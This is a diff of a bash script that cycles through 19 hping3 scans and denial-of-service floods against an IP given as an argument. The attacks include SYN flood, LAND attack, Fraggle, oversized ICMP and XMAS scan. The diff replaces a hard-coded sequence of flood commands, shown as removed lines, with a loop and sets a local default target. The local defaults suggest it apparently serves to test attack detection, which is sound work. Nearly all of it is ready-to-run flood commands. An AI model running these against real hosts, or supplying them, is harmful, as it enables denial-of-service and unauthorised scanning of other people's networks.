@@ -1,13 +1,15 @@
 #!/bin/bash
-IP=192.168.225.1
-
-type=20
+IP=127.0.0.1
+type=0
+max_num=19
 
 usage() {
+    clear
     echo "[I] Usage: [sh $0 num IP]"
     echo "num: Attack type. IP: Attack address,the default value is 192.168.225.1"
     echo "eg: [sh $0 1 192.168.1.100], Attack type is TCP_SYN_SCAN, attack address is 192.168.1.100"
     echo "eg: [sh $0 2], Attack type is TCP_NULL_SCAN, attack address is 192.168.225.1"
+    echo '0  ALL attack'
     echo '1  TCP_SYN_SCAN'
 	echo '2  TCP_NULL_SCAN'
 	echo '3  TCP_FIN_SCAN'
@@ -27,109 +29,29 @@ usage() {
     echo '17 TCP_SRC_PORT_ZERO'
     echo '18 TCP_FIN_SYN_DOS' 
     echo '19 UDP_PORT_SCAN'   
-    echo '1-19 automatic'       
 }
 
 automatic(){
-    echo 'TCP_SYN_SCAN'
-    hping3 -8 all -S $IP &
-    sleep 3
-    killall -9 hping3
 
-    echo 'TCP_NULL_SCAN'
-    hping3 -8 all  $IP &
-    sleep 3
-    killall -9 hping3
-
-    echo 'TCP_FIN_SCAN'
-    hping3 -8 all -F $IP &
-    sleep 3
-    killall -9 hping3
- 
-    echo 'TCP_ACK_SCAN'
-    hping3 --flood -8 all -A $IP &
-    sleep 3
-    killall -9 hping3
- 
-    echo 'TCP_FIN_RST_DOS'
-    hping3 --flood -F -R -p 5000 $IP &
-    sleep 3
-    killall -9 hping3
-       
-    echo 'TCP_ACK_FIN_DOS'
-    hping3 --flood -F -A -p 5000 $IP &
-    sleep 3
-    killall -9 hping3
-     
-    echo 'TCP_SYN_ACK_FLOOD'
-    hping3 --flood -S -A -p 5000 $IP &
-    sleep 3
-    killall -9 hping3
-      
-    echo 'TCP_ACK_RST_DOS'
-    hping3 --flood -R -A -p 5000 $IP &
-    sleep 3
-    killall -9 hping3
-      
-    echo 'TCP_ACK_PSH_FLOOD'
-    hping3 --flood -P -A -p 5000 $IP &
-    sleep 3
-    killall -9 hping3
-      
-    echo 'TCP_SYN_FLOOD'
-    hping3 --flood -S -p 5000 $IP &
-    sleep 3
-    killall -9 hping3
-   
-    echo 'TCP_XMAS_SCAN'
-    hping3 --flood -P -U -F -p ++ $IP &
-    sleep 3
-    killall -9 hping3
-    
-    echo 'UDP_SRC_PORT_ZERO'
-    hping3 --flood -2 -s 0 $IP &
-    sleep 3
-    killall -9 hping3
-      
-    echo 'FRAGGLE_ATTACK'
-    hping3 --flood -2 $IP -s 1-1024 -p 7 &
-    sleep 3
-    killall -9 hping3
-     
-    echo 'UDP_PORT_FLOOD'
-    hping3 --flood -2 $IP -s 1-1024 -p 7 &
-    sleep 3
-    killall -9 hping3
-      
-    echo 'TCP_LAND_ATTACK'
-    hping3 --flood -S -a $IP $IP &
-    sleep 3
-    killall -9 hping3
-     
-    echo 'ICMP_LARGE_PING'
-    hping3 --flood --icmp -d 1800 $IP &
-    sleep 3
-    killall -9 hping3
-      
-    echo 'TCP_SRC_PORT_ZERO'
-    hping3 --faster -s 0 -p 5000 $IP &
-    sleep 3
-    killall -9 hping3
-     
-    echo 'TCP_FIN_SYN_DOS'
-    hping3 --flood -F -S -p 5000 $IP &
-    sleep 3
-    killall -9 hping3
-     
-    echo 'UDP_PORT_SCAN'
-    hping3 --flood -2 -p ++  $IP &
-    sleep 3
-    killall -9 hping3
+    for i in $(seq 1 $max_num);do
+         clear
+         do_hping3 $i &
+         sleep 5
+         killall hping3
+     done
 
 }
 
 do_hping3() {
-    case $type in
+    
+    local  num=$1
+    if [ "$type" -ne 0 ];then
+        num=$type
+    fi
+    case $num in
+        0)
+            automatic
+            ;;
         1)
             echo 'TCP_SYN_SCAN'
             hping3 -8 all -S $IP
@@ -206,9 +128,6 @@ do_hping3() {
             echo 'UDP_PORT_SCAN'
             hping3 --flood -2 -p ++  $IP
             ;; 
-        20)
-            automatic
-            ;;
         *)
             usage
             ;;
@@ -222,6 +141,6 @@ else
     if [ $# = 2 ];then
         IP=$2
     fi
-    do_hping3
+    do_hping3 0
 fi
 
